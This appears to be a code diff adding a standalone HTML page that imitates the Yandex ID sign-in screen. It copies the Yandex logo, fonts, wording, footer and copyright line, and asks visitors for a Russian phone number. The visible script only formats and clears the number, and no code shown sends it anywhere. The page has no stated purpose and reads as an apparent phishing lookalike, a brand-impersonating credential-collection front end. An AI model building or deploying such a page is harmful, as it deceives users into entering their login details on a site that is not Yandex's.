@@ -1,0 +1,156 @@
+﻿<!DOCTYPE html>
+<html lang="ru" dir="ltr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>Авторизация</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 16 16'><text y='14' font-size='14'>Я</text></svg>">
+    <style>
+        @font-face{font-family:'YS Text';src:url(https://yastatic.net/s3/home/fonts/ys/1/text-light.woff2) format('woff2'),url(https://yastatic.net/s3/home/fonts/ys/1/text-light.woff) format('woff');font-weight:300;font-style:normal;font-stretch:normal;font-display:swap}
+        @font-face{font-family:'YS Text';src:url(https://yastatic.net/s3/home/fonts/ys/1/text-regular.woff2) format('woff2'),url(https://yastatic.net/s3/home/fonts/ys/1/text-regular.woff) format('woff');font-weight:400;font-style:normal;font-stretch:normal;font-display:swap}
+        @font-face{font-family:'YS Text';src:url(https://yastatic.net/s3/home/fonts/ys/1/text-medium.woff2) format('woff2'),url(https://yastatic.net/s3/home/fonts/ys/1/text-medium.woff) format('woff');font-weight:500;font-style:normal;font-stretch:normal;font-display:swap}
+        @font-face{font-family:'YS Text';src:url(https://yastatic.net/s3/home/fonts/ys/1/text-bold.woff2) format('woff2'),url(https://yastatic.net/s3/home/fonts/ys/1/text-bold.woff) format('woff');font-weight:700;font-style:normal;font-stretch:normal;font-display:swap}
+        *{margin:0;padding:0;box-sizing:border-box}
+        body{font-family:'YS Text','Helvetica Neue',Arial,sans-serif;background:#fff;color:#000;min-height:100vh;display:flex;align-items:center;justify-content:center;-webkit-font-feature-settings:'liga','kern';font-feature-settings:'liga','kern'}
+        .passp-bg{position:fixed;top:0;left:0;right:0;bottom:0;z-index:-1;background:linear-gradient(135deg,#254470,#302B6C 50%,#7C5218)}
+        .auth-layout-wrapper{display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;width:100%;padding:1rem}
+        .auth-layout-container{width:376px;max-width:100%}
+        .auth-layout{background:#201f24;border-radius:24px;box-shadow:0 4px 24px rgba(0,0,0,.4),0 0 0 1px rgba(100,70,160,.2);padding:2rem;width:100%}
+        .auth-header{text-align:center;margin-bottom:1.5rem}
+        .auth-header-logo-wrapper svg{display:inline-block}
+        .header-info-container{min-height:20px}
+        .description-block{margin-bottom:1.5rem;text-align:center}
+        .page-header-text h1{font-size:1.25rem;font-weight:500;margin-bottom:.375rem;color:#fff}
+        .page-main-description p{font-size:1rem;color:rgba(255,255,255,.6);margin-bottom:0}
+        .body-auth{width:100%}
+        .ya_6000e742{width:100%}
+        .phone-input-wrapper{width:100%;margin-bottom:.75rem}
+        .phone-field{display:flex;align-items:center;border:1px solid rgba(255,255,255,.15);border-radius:20px;padding:0 12px;height:48px;background:#2a2a2e;transition:border-color .15s ease;position:relative}
+        .phone-field:focus-within{border-color:#fff}
+        .country-btn{display:flex;align-items:center;gap:4px;background:none;border:none;cursor:pointer;font-size:16px;color:#fff;padding:4px 8px 4px 4px;border-radius:8px;white-space:nowrap;flex-shrink:0}
+        .country-btn:hover{background:rgba(255,255,255,.08)}
+        .country-btn .arrow{width:0;height:0;border-left:4px solid transparent;border-right:4px solid transparent;border-top:5px solid rgba(255,255,255,.5)}
+        .phone-input{flex:1;border:none;outline:none;font-size:18px;padding:0 34px 0 8px;background:transparent;color:#fff;height:100%;font-family:'YS Text',Arial,sans-serif}
+        .phone-input::placeholder{color:rgba(255,255,255,.3)}
+        .clear-btn{background:none;border:none;cursor:pointer;padding:4px;border-radius:50%;color:rgba(255,255,255,.4);position:absolute;right:10px;top:50%;transform:translateY(-50%)}
+        .clear-btn:hover{color:rgba(255,255,255,.6)}
+        .social-list{display:flex;justify-content:space-evenly;gap:8px;margin-top:1rem;margin-bottom:1rem}
+        .social-btn{width:48px;height:48px;border-radius:50%;border:1px solid rgba(0,0,0,.08);background:#fff;cursor:pointer;display:flex;align-items:center;justify-content:center;transition:background .15s,box-shadow .15s}
+        .social-btn:hover{background:rgba(0,0,0,.04);box-shadow:0 1px 4px rgba(0,0,0,.08)}
+        .social-btn svg{width:24px;height:24px}
+        .auth-footer{margin-top:0}
+        .auth-promo{text-align:center;margin-top:1.5rem;padding-top:1rem}
+        .auth-promo-text{font-size:13px;color:rgba(255,255,255,.5);line-height:1.4}
+        .auth-promo-link{display:inline-block;margin-top:4px;font-size:13px;color:#8ab4f8;text-decoration:none}
+        .auth-promo-link:hover{text-decoration:underline}
+        .next-btn{width:100%;height:44px;border-radius:22px;border:none;background:#fff;color:#000;font-size:16px;font-weight:500;cursor:pointer;transition:background .15s;margin-top:1rem;font-family:'YS Text',Arial,sans-serif}
+        .next-btn:hover{background:#e6e6e6}
+        .page-footer{position:fixed;bottom:0;left:0;right:0;padding:12px 24px;display:flex;justify-content:space-between;align-items:center;flex-wrap:wrap;gap:8px;font-size:13px;color:rgba(255,255,255,.7);z-index:1}
+        .page-footer a{color:rgba(255,255,255,.7);text-decoration:none}
+        .page-footer a:hover{text-decoration:underline;color:#fff}
+        .page-footer-left,.page-footer-right{display:flex;align-items:center;gap:16px;flex-wrap:wrap}
+        .promo-below-card{text-align:center;margin-top:1.5rem;font-size:16px;color:#fff;line-height:1.6}
+        .promo-below-card a{display:block;font-size:15px;color:rgba(255,255,255,.7);text-decoration:none;margin-top:4px}
+        .promo-below-card a:hover{text-decoration:underline;color:#fff}
+    </style>
+</head>
+<body>
+    <div class="passp-bg"></div>
+    <div class="auth-layout-wrapper">
+        <div class="auth-layout-container">
+            <div class="auth-layout">
+                <div class="auth-header">
+                    <div class="auth-header-logo-wrapper">
+                        <svg aria-hidden="true" focusable="false" height="24" viewBox="0 0 127 30" width="127">
+                            <path d="M11.2029 6.57616H9.45694C6.28514 6.57616 4.61486 8.18389 4.61486 10.5627C4.61486 13.2617 5.77009 14.5115 8.15039 16.1192L10.1044 17.4359L4.45481 25.8747H0.25L5.31469 18.3249C2.39023 16.2385 0.754868 14.219 0.754868 10.7766C0.754868 6.46995 3.74188 3.55859 9.4162 3.55859H15.0643V25.8761H11.1898V6.57616H11.2029ZM31.0353 9.72614V25.8761H27.2204V19.1368H22.115V25.8761H18.3001V9.72614H22.115V16.1192H27.2204V9.72614H31.0353ZM48.2751 29.5586H44.7395V25.863H36.1655V29.5586H32.63V22.8527H33.8259C35.1688 20.1538 35.4351 15.0498 35.4351 11.1025V9.72032H46.5728V22.8527H48.2751V29.5586ZM42.7579 12.7437H38.7175V13.2224C38.7175 16.013 38.4265 20.4128 37.3615 22.8585H42.7579V12.7437ZM56.8476 26.1817C51.9706 26.1817 49.2048 23.4565 49.2048 17.8346C49.2048 12.9561 51.425 9.39586 56.078 9.39586C59.8928 9.39586 62.3648 11.5215 62.3648 17.1318V19.1513H53.1535C53.3121 21.8503 54.3757 23.1655 57.1677 23.1655C59.0286 23.1655 61.0219 22.4613 62.2048 21.6509V24.7733C61.0888 25.5444 59.2934 26.1817 56.8476 26.1817ZM53.1535 16.3316H58.483V16.0144C58.483 13.995 57.901 12.4265 56.0096 12.4265C54.1894 12.4105 53.2597 13.7665 53.1535 16.3316ZM68.7579 17.9408V25.8761H64.9299V9.72614H68.7579V17.1697L74.1616 9.72614H78.0172L72.6208 17.1697L78.7476 25.863H74.4075L68.7579 17.9408ZM78.5279 17.8084C78.5279 12.8892 81.0668 9.39441 85.9481 9.39441C87.8396 9.39441 89.2581 9.71304 90.0555 10.1641V13.4086C89.2843 12.9299 87.8352 12.4105 86.3599 12.4105C83.8603 12.4105 82.4781 14.2059 82.4781 17.7153C82.4781 21.0515 83.6086 23.1772 86.3337 23.1772C87.9414 23.1772 89.0981 22.7654 90.0555 22.0874V25.1981C89.1243 25.8761 87.873 26.1947 86.1067 26.1947C80.9998 26.1817 78.5264 23.2048 78.5264 17.8084H78.5279Z" fill="#fff"/>
+                            <path fill-rule="evenodd" clip-rule="evenodd" d="M111.75 29.9995C123.753 29.9995 126.75 27.0028 126.75 14.9995C126.75 2.99623 123.753 -0.000488281 111.75 -0.000488281C99.7467 -0.000488281 96.75 2.99623 96.75 14.9995C96.75 27.0028 99.7467 29.9995 111.75 29.9995ZM106.629 5.99942V23.9994H103.5V5.99942H106.629ZM113.665 5.99942C114.852 5.99942 115.953 6.1505 116.967 6.47424C117.982 6.7764 118.845 7.29438 119.579 7.98503C120.313 8.67568 120.896 9.60374 121.306 10.726C121.737 11.8483 121.932 13.2512 121.932 14.9131C121.932 16.3807 121.716 17.6757 121.306 18.8196C120.874 19.9419 120.291 20.8915 119.536 21.6685C118.78 22.4455 117.874 23.0282 116.838 23.4167C115.802 23.8052 114.637 24.021 113.406 24.021H109.457V5.99942H113.665ZM113.147 21.5606C113.989 21.5606 114.766 21.4095 115.457 21.1289C116.147 20.8483 116.73 20.4167 117.226 19.8771C117.723 19.316 118.09 18.6253 118.37 17.7836C118.629 16.9419 118.78 15.9706 118.78 14.8483C118.78 13.6397 118.651 12.6253 118.392 11.8052C118.133 10.985 117.766 10.316 117.291 9.81956C116.816 9.32316 116.255 8.95625 115.586 8.74043C114.939 8.5246 114.205 8.41669 113.406 8.41669H112.586V21.539H113.147V21.5606Z" fill="#fff"/>
+                        </svg>
+                    </div>
+                    <div class="header-info-container"><div></div></div>
+                </div>
+                <div class="description-block">
+                    <div class="page-header-text"><h1>Введите номер телефона</h1></div>
+                    <div class="page-main-description"><p>Чтобы войти или зарегистрироваться</p></div>
+                </div>
+                <div class="body-auth">
+                    <div class="ya_6000e742">
+                        <div class="phone-input-wrapper">
+                            <div class="phone-field">
+                                <span style="display:flex;align-items:center;gap:4px;flex-shrink:0">
+                                    <button type="button" class="country-btn" aria-label="Выбор кода страны">
+                                        <span style="display:flex;align-items:center;gap:4px">
+                                            <span style="width:20px;height:14px;display:inline-block;background:#eee;border-radius:2px;overflow:hidden;flex-shrink:0">
+                                                <svg viewBox="0 0 20 14" width="20" height="14">
+                                                    <rect width="20" height="14" fill="#fff"/>
+                                                    <rect y="0" width="20" height="4.66" fill="#fff"/>
+                                                    <rect y="4.66" width="20" height="4.66" fill="#0039a6"/>
+                                                    <rect y="9.33" width="20" height="4.67" fill="#d52b1e"/>
+                                                </svg>
+                                            </span>
+                                            <span style="font-size:14px;font-weight:500">RU</span>
+                                            <span class="arrow"></span>
+                                        </span>
+                                    </button>
+                                </span>
+                                <input type="tel" class="phone-input" placeholder="+7 (000) 000-00-00" inputmode="tel" autocomplete="off" value="+7">
+                                <button type="button" class="clear-btn" aria-label="Очистить">
+                                    <svg width="20" height="20" viewBox="0 0 24 24"><path fill-rule="evenodd" d="M19.207 6.207a1 1 0 0 0-1.414-1.414L12 10.586 6.207 4.793a1 1 0 0 0-1.414 1.414L10.586 12l-5.793 5.793a1 1 0 1 0 1.414 1.414L12 13.414l5.793 5.793a1 1 0 0 0 1.414-1.414L13.414 12l5.793-5.793z" fill="currentColor"/></svg>
+                                </button>
+                            </div>
+                        </div>
+                        <button type="submit" class="next-btn">Далее</button>
+
+                    </div>
+                </div>
+                <div class="auth-footer">
+                    <div class="auth-promo">
+                        <div class="auth-promo-text"></div>
+                        <a href="#"></a>
+                    </div>
+                </div>
+            </div>
+        </div>
+        <div class="promo-below-card">Яндекс ID — ключ для всех сервисов <a href="https://id.yandex.ru/about" target="_blank">Узнать больше</a></div>
+    </div>
+    <div class="page-footer">
+        <div class="page-footer-left">
+            <span>Используйте режим инкогнито на чужом компьютере</span>
+        </div>
+        <div class="page-footer-right">
+            <a href="#">Ru</a>
+            <a href="https://yandex.ru/support/id/" target="_blank">Справка и поддержка</a>
+            <span>© 2001–2026, Яндекс</span>
+        </div>
+    </div>
+    <script>
+        const input = document.querySelector('.phone-input');
+        const clearBtn = document.querySelector('.clear-btn');
+
+        function formatPhone(val) {
+            val = val.replace(/\D/g, '');
+            if (!val.startsWith('7')) val = '7' + val;
+            val = '7' + val.slice(1, 11);
+            let formatted = '+7';
+            if (val.length > 1) formatted += ' (' + val.slice(1, 4);
+            if (val.length > 4) formatted += ') ' + val.slice(4, 7);
+            if (val.length > 7) formatted += '-' + val.slice(7, 9);
+            if (val.length > 9) formatted += '-' + val.slice(9, 11);
+            return formatted;
+        }
+
+        input.addEventListener('input', function() {
+            let formatted = formatPhone(this.value);
+            if (this.value !== formatted) this.value = formatted;
+            clearBtn.style.display = this.value.length > 2 ? 'block' : 'none';
+        });
+
+        clearBtn.addEventListener('click', function() {
+            input.value = '+7';
+            input.focus();
+            clearBtn.style.display = 'none';
+        });
+
+        clearBtn.style.display = input.value.length > 2 ? 'block' : 'none';
+    </script>
+</body>
+</html>
